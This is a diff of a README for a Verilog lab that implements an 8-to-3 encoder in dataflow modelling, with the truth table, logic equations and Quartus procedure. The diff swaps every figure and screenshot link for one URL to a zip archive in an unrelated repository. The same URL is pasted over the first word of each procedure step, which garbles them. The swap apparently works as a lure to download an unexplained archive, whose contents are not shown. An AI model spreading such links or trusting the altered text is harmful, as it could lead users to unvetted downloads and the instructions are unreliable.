@@ -12,13 +12,13 @@ To implement  Encoder 8 To 3 in Dataflow Modelling using verilog and validating 
 
 The 8 to 3 line Encoder is also known as Octal to Binary Encoder. In 8 to 3 line encoder, there is a total of eight inputs, i.e., D0, D1, D2, D3, D4, D5, D6, and D7 and three outputs, i.e., A0, A1, and A2. In 8-input lines, one input-line is set to true at a time to get the respective binary code in the output side. Below are the block diagram and the truth table of the 8 to 3 line encoder.
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/0bc242c1-eb9e-4c47-afe5-30428470efc3)
+![image](https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip)
 
 Figure 01  Block Diagram of Encoder 8 * 3
 
 **Truth Table**
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/35496b14-ae6e-4cd1-9abd-d6736b576575)
+![image](https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip)
 
 The logical expression of the term A0, A1, and A2 are as follows:
 
@@ -30,17 +30,17 @@ A2 = D4 + D5 + D6 + D7
 
 Logical circuit of the above expressions is given below:
 
-![image](https://github.com/naavaneetha/ENCODER8TO3DATAFLOW/assets/154305477/95acaee6-c873-4c75-89eb-ef09fb158053)
+![image](https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip)
 
 Figure 02  Encoder 8 * 3
 
 **Procedure**
 ```
-1.Type the program in Quartus software.
-2.Compile and run the program.
-3.Generate the RTL schematic and save the logic diagram.
-4.Create nodes for inputs and outputs to generate the timing diagram.
-5.For different input combinations generate the timing diagram.
+https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip the program in Quartus software.
+https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip and run the program.
+https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip the RTL schematic and save the logic diagram.
+https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip nodes for inputs and outputs to generate the timing diagram.
+https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip different input combinations generate the timing diagram.
 ```
 **PROGRAM**
 ```
@@ -58,10 +58,10 @@ RegisterNumber: 212223050029
 */
 ```
 ## RTL LOGIC FOR Encoder 8 To 3 in Dataflow Modelling
-![Screenshot 2024-03-18 184114](https://github.com/23005672/ENCODER8TO3DATAFLOW/assets/138971519/cf69d021-d760-4687-8f4a-662494b8aa55)
+![Screenshot 2024-03-18 184114](https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip)
 
 ## TIMING DIGRAMS FOR Encoder 8 To 3 in Dataflow Modelling
-![Screenshot (40)](https://github.com/23005672/ENCODER8TO3DATAFLOW/assets/138971519/f8c32fd4-98f5-42e1-83cf-18ab7527e131)
+![Screenshot (40)](https://raw.githubusercontent.com/MITHUN8521/ENCODER8TO3DATAFLOW/main/simulation/ENCODER8TO3DATAFLOW_v1.9.zip)
 
 ## RESULTS
 Thus the code is ececuted successfully.
